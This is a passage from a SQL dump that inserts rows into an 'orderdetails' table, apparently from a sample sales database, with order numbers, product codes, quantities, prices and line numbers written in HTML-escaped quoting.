\u0026#39;168.30\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10288\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;50.25\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10288\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;102.98\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10288\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;90.19\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10288\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;57.02\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10288\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;66.88\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10288\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;49.30\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10288\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;32.19\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10288\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;81.78\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10288\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;109.22\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10288\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;76.19\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10288\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;101.73\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10288\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;37.75\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10289\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;92.47\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10289\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;44.75\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10289\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;141.75\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10289\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;41.22\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10290\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;80.36\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10290\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;83.76\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10291\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;210.01\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10291\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;141.83\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10291\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;123.00\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10291\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;96.84\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10291\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;52.26\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10291\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;99.28\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10291\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;56.21\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10291\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;93.20\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10291\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;96.86\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10291\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;45.28\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10291\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;109.90\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10291\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;82.83\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10291\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;53.00\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10291\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;86.99\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10292\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;94.80\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10292\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;140.81\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10292\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;103.09\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10292\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;147.33\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10292\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;114.90\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10292\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;48.55\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10292\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;34.30\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10292\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;113.55\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10292\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;54.11\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10292\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;59.65\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10292\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;113.44\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10292\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;49.79\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10293\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;187.02\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10293\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;129.93\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10293\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;171.29\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10293\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;110.64\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10293\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;91.76\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10293\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;72.85\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10293\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;111.83\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10293\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;77.95\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10293\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;51.32\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10294\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;98.32\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10295\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;136.00\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10295\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;84.08\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10295\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;62.00\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10295\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;71.56\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10295\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;93.16\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10296\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;146.65\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10296\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;69.68\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10296\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;105.87\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10296\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;60.97\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10296\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;63.78\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10296\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;83.02\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10296\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;63.46\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10296\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;41.02\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10296\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;75.81\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10296\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;89.61\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10296\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;96.73\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10296\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;74.40\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10296\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;61.44\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10296\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;46.68\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10297\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;81.95\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10297\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;107.23\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10297\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;70.08\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10297\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;71.73\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10297\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;88.90\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10297\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;63.29\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10297\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;111.53\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10298\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;105.86\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10298\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;60.57\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10299\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;76.56\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10299\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;164.61\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10299\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;123.51\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10299\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;62.17\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10299\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;119.04\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10299\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;107.07\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10299\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;58.87\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10299\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;66.29\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10299\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;36.21\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10299\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;84.70\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10299\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;77.29\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10300\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;184.84\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10300\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;116.27\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10300\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;76.61\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10300\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;95.58\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10300\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;63.14\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10300\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;65.94\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10300\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;144.05\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10300\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;52.05\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10301\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;114.65\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10301\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;118.22\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10301\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;119.49\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10301\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;113.52\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10301\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;135.47\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10301\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;137.04\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10301\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;64.67\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10301\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;40.75\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10301\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;32.10\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10301\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;86.73\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10301\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;122.17\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10302\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;166.60\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10302\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;82.83\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10302\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;70.56\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10302\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;75.42\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10302\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;104.52\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10302\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;74.48\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10303\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;56.91\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10303\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;35.70\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10304\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;201.44\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10304\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;117.54\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10304\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;106.17\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10304\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;95.55\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10304\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;46.90\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10304\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;102.98\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10304\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;141.75\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10304\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;98.27\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10304\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;54.34\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10304\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;90.06\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10304\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;95.24\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10304\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;44.27\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10304\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;29.21\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10304\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;42.11\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10304\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;80.83\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10304\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;52.36\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10304\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;80.92\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10305\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;130.01\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10305\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;107.84\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10305\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;132.62\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10305\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;117.82\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES 